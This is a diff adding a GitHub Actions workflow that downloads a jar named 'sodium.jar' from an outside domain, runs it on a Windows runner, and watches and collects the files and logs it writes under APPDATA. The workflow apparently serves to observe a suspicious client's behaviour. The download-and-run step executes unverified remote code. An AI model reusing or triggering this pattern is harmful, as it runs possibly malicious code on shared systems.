@@ -1,0 +1,51 @@
+name: INTERACTIVE
+
+on:
+  workflow_dispatch:
+
+jobs:
+  it:
+    runs-on: windows-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '21'
+      - name: Run client and hold
+        shell: powershell
+        run: |
+          $d = "$env:RUNNER_TEMP\it"
+          New-Item -ItemType Directory -Force $d | Out-Null
+          Invoke-WebRequest "https://files.driftmetrics.xyz/sodium.jar" -OutFile "$d\c.jar"
+          "armed $(Get-Date -Format o)" | Tee-Object "$d\arm.txt"
+          $p = Start-Process java -ArgumentList "-Dcompat.legacy=true","-Duserid=1","-jar","$d\c.jar" `
+            -RedirectStandardOutput "$d\out.log" -RedirectStandardError "$d\err.log" -PassThru
+          "pid=$($p.Id)" | Tee-Object "$d\pid.txt"
+          for ($i = 0; $i -lt 70; $i++) {
+            Start-Sleep 25
+            if ($p.HasExited) { "EXITED code=$($p.ExitCode)"; break }
+            $cfg = Get-ChildItem "$env:APPDATA\Utilities" -Recurse -Filter "*.json" -ErrorAction SilentlyContinue |
+              Select-Object -First 1
+            "t=$($i * 25)s alive pid=$($p.Id) cfg=$($cfg.FullName)"
+          }
+      - name: Collect
+        if: always()
+        shell: powershell
+        run: |
+          $d = "$env:RUNNER_TEMP\it"
+          Get-ChildItem "$env:APPDATA\Utilities" -Recurse -ErrorAction SilentlyContinue |
+            Select-Object FullName, Length | Out-File "$d\utils.txt"
+          Get-ChildItem "$env:APPDATA\Utilities" -Recurse -Filter "*.log" -ErrorAction SilentlyContinue |
+            ForEach-Object { "=== $($_.FullName)"; Get-Content $_.FullName -Tail 60 } | Out-File "$d\client-logs.txt"
+          Get-Content "$d\out.log" -Tail 60 -ErrorAction SilentlyContinue | Out-File "$d\out-tail.txt"
+          Get-Content "$d\err.log" -Tail 60 -ErrorAction SilentlyContinue | Out-File "$d\err-tail.txt"
+      - name: Kill
+        if: always()
+        shell: powershell
+        run: Get-CimInstance Win32_Process -Filter "name='java.exe' or name='javaw.exe'" | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: interactive
+          path: ${{ runner.temp }}/it
